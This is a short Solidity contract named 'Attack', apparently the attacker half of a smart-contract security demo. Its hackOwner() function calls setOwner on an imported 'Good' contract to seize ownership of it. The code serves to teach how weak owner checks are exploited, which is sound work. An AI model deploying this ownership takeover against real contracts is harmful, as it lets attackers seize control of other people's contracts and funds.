pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {

    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function hackOwner() public {
        good.setOwner(address(this));
    }
}